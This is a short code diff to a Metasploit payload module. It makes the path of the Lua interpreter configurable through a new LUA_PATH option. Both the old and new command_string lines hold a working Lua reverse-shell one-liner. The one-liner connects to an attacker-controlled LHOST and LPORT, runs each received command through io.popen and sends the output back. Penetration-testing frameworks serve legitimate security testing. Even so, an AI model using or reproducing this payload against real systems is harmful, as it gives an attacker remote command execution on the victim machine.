@@ -32,6 +32,9 @@ module MetasploitModule
         'Payload' => ''
       }
     ))
+    register_options([
+      OptString.new('LUA_PATH', [true, 'The path to Lua interpreter', 'lua'])
+    ])
   end
 
   #
@@ -45,7 +48,7 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    "lua -e \"local s=require('socket');local t=assert(s.tcp());t:connect('#{datastore['LHOST']}',#{datastore['LPORT']});while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();\""
+    "#{datastore['LUA_PATH']} -e \"local s=require('socket');local t=assert(s.tcp());t:connect('#{datastore['LHOST']}',#{datastore['LPORT']});while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();\""
   end
 end
 
